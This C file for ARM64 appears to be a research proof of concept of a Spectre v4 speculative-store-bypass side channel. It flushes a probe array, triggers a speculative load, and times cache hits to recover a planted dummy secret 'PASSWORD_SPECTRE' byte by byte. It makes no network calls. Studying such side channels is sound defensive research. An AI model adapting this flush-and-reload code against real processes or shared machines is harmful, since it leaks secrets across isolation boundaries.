#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include "utils.h"

#define LEN 16
#define MAX_TRIES 200
#define CACHE_HIT_THRESHOLD 190
#define REPEAT_16(x) x x x x x x x x x x x x x x x x
#define REPEAT_10(x) x x x x x x x x x x 

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )

#define EORS(n) \
    asm volatile( \
        ".rept %0\n" \
        "eor x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		: "x10" \
    )



unsigned char** memory_slot_ptr[256] __attribute__((aligned(4096)));
unsigned char* memory_slot[256] __attribute__((aligned(4096)));
unsigned char memory[100];
static unsigned char cache_miss = 0;
unsigned char secret_key[] = "PASSWORD_SPECTRE";
unsigned char public_key[] = "################";
unsigned char *password;
unsigned char *dummy_buffer;
static unsigned char  miss_index __attribute__((aligned(4096))) = 8;

uint8_t *probe;
volatile uint8_t tmp = 0;

static inline __attribute__((always_inline)) void measure_time() {
	uint64_t init;
	uint64_t end;
	volatile uint64_t pick;
	asm volatile(
	"ldr x1, %[val]\n"
	:
	:[val] "m" (pick)
	: "x1"
	);
	for(volatile int z = 0; z < 100; z++){}
	isb();

	init = get_cycles();
	NOPS(200);
	asm volatile(
	"adds x1, x1, #1\n"
	::: "x1"
	);
	end = get_cycles();
	isb();

	asm volatile(
	"str x1, %[val]\n"
	:
	: [val] "m" (pick)
	: "x1"
	);
	        printf("%ld\n", end - init);
	}

static inline __attribute__((always_inline)) void spectre_v4(size_t idx) {
	register uint64_t  access = 8;
	register uint64_t  id = 8;
	miss_index = 8;
	isb();
	tmp = cache_miss;
	asm volatile (
//			"fdiv d0, d0, d1\n\r"
			"fcvtzs x2, d0\n\r"
			"mov x2, #0\n\r"
			"add %[access], %[access], x2\n\r" 
    		: [access] "+r" (access)        
    		:                            
    		: "x2", "d0"                      
		);
	memory[id] = 100;
	EORS(100);
	tmp = probe[memory[access] << 12];
}


static inline __attribute__((always_inline)) void attacker_function(int idx) {
	int access_index = 0;


		int results[256] = {0};
		volatile unsigned char pick = 0;
		for (int tries = 0; tries < MAX_TRIES; tries++) {

			memset(memory, 31, sizeof(uint64_t) * 10);
			*memory_slot = secret_key;
//			cacheflush(&cache_miss);
//			cacheflush(memory_slot_ptr);
			cacheflush(&cache_miss);
//			cacheflush(&miss_index);
//			cacheflush(&index);
			for (int i = 0; i < 256; i++) {
				cacheflush(&probe[i * 4096]);
			}
			isb();
#ifdef N
			NOPS(N);
#endif

			spectre_v4(idx);

			for (int i = 0; i < 256; i++) {
				access_index = ((i * 167) + 13) & 255;
				isb();
				uint64_t time1 = get_cycles(); // read timer
				pick = probe[access_index << 12]; // memory access to time
				uint64_t time2 = get_cycles() - time1; // read timer and compute elapsed time
				isb();

				if (time2 <= CACHE_HIT_THRESHOLD && access_index != 100){
					results[access_index]++; // cache hit
				}
			}
		}
		int highest = -1;
		for (int i = 0; i < 256; i++) {
			if (highest < 0 || results[highest] < results[i]) {
				highest = i;
			}
		}
		printf("highest:%c, %d, hitrate:%f\n", highest, highest,
			(double)results[highest] * 100 / MAX_TRIES);
		*(password + idx) = highest;
}


int main(void) {
	probe = (unsigned char *)mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	memset(probe, 0, sizeof(uint8_t) * 256 * 4096);
	dummy_buffer = (unsigned char *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	memset(dummy_buffer, 0, 4096);
	password = (unsigned char *)malloc(sizeof(unsigned char) * LEN);
//	for(int j = 0; j < 256; j++){
//		memory_slot_ptr[j] = &memory_slot[j];
//	}


	int idx = 0;
	REPEAT_16(
	attacker_function(idx);
	idx ++;
	)

	printf("%s\n", password);
	free(password);
	password = NULL;
}
